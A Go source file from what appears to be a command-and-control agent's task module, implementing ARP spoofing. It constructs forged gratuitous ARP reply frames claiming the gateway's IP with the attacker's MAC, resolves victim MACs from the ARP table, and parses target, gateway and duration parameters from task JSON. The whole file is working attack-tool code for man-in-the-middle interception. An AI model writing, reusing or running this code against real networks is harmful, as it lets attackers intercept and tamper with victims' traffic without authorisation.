package commands

import (
	"encoding/binary"
	"encoding/json"
	"fmt"
	"net"
)

// ARP protocol constants
const (
	arpHardwareEthernet = 1
	arpProtocolIPv4     = 0x0800
	arpOpReply          = 2
	arpHardwareLen      = 6  // MAC address length
	arpProtocolLen      = 4  // IPv4 address length
	arpPacketLen        = 42 // 14 (Ethernet) + 28 (ARP)
	arpSpoofMaxDur      = 600 // max 10 minutes
	etherTypeARP        = 0x0806
)

// arpSpoofArgs holds parsed ARP spoof parameters.
type arpSpoofArgs struct {
	Target    string `json:"target"`
	Gateway   string `json:"gateway"`
	Interface string `json:"interface"`
	Duration  int    `json:"duration"`
	Interval  int    `json:"interval"`
}

// arpSpoofResult tracks ARP spoofing session outcomes.
type arpSpoofResult struct {
	Target       string `json:"target"`
	Gateway      string `json:"gateway"`
	Interface    string `json:"interface"`
	Duration     string `json:"duration"`
	PacketsSent  int    `json:"packets_sent"`
	AttackerMAC  string `json:"attacker_mac"`
	ForwardingOn bool   `json:"forwarding_enabled"`
	Restored     bool   `json:"arp_restored"`
	Errors       []string `json:"errors,omitempty"`
}

// buildARPReply constructs a raw Ethernet frame containing a gratuitous ARP reply.
// This makes the target believe that gatewayIP has attackerMAC as its MAC address.
//
// Frame layout:
//   Ethernet header (14 bytes): dst_mac(6) + src_mac(6) + ethertype(2)
//   ARP payload (28 bytes): hw_type(2) + proto_type(2) + hw_len(1) + proto_len(1) +
//     opcode(2) + sender_mac(6) + sender_ip(4) + target_mac(6) + target_ip(4)
func buildARPReply(targetMAC, attackerMAC net.HardwareAddr, gatewayIP, targetIP net.IP) []byte {
	frame := make([]byte, arpPacketLen)

	// Ethernet header
	copy(frame[0:6], targetMAC)        // Destination MAC = victim
	copy(frame[6:12], attackerMAC)     // Source MAC = attacker
	binary.BigEndian.PutUint16(frame[12:14], etherTypeARP) // EtherType = ARP

	// ARP header
	binary.BigEndian.PutUint16(frame[14:16], arpHardwareEthernet)
	binary.BigEndian.PutUint16(frame[16:18], arpProtocolIPv4)
	frame[18] = arpHardwareLen
	frame[19] = arpProtocolLen
	binary.BigEndian.PutUint16(frame[20:22], arpOpReply)

	// Sender (what we're claiming): attacker's MAC + gateway's IP
	copy(frame[22:28], attackerMAC)
	copy(frame[28:32], gatewayIP.To4())

	// Target: victim's MAC + victim's IP
	copy(frame[32:38], targetMAC)
	copy(frame[38:42], targetIP.To4())

	return frame
}

// resolveMAC looks up the MAC address for an IP by reading the ARP table.
func resolveMAC(ip string) (net.HardwareAddr, error) {
	entries, err := getArpTable()
	if err != nil {
		return nil, err
	}
	for _, e := range entries {
		if e.IP == ip {
			return net.ParseMAC(e.MAC)
		}
	}
	// If not in ARP table, try to trigger ARP resolution by connecting
	conn, err := net.DialTimeout("udp4", ip+":1", 2*1e9)
	if err == nil {
		conn.Close()
	}
	// Re-read ARP table
	entries, err = getArpTable()
	if err != nil {
		return nil, err
	}
	for _, e := range entries {
		if e.IP == ip {
			return net.ParseMAC(e.MAC)
		}
	}
	return nil, fmt.Errorf("could not resolve MAC for %s", ip)
}

// parseArpSpoofArgs extracts and validates spoof parameters from task JSON.
func parseArpSpoofArgs(params string) (*arpSpoofArgs, error) {
	var args arpSpoofArgs
	if err := json.Unmarshal([]byte(params), &args); err != nil {
		return nil, err
	}
	if args.Target == "" || args.Gateway == "" {
		return nil, fmt.Errorf("target and gateway IPs are required for ARP spoof")
	}
	if net.ParseIP(args.Target) == nil {
		return nil, fmt.Errorf("invalid target IP: %s", args.Target)
	}
	if net.ParseIP(args.Gateway) == nil {
		return nil, fmt.Errorf("invalid gateway IP: %s", args.Gateway)
	}
	if args.Duration <= 0 {
		args.Duration = 120
	}
	if args.Duration > arpSpoofMaxDur {
		args.Duration = arpSpoofMaxDur
	}
	if args.Interval <= 0 {
		args.Interval = 2
	}
	return &args, nil
}
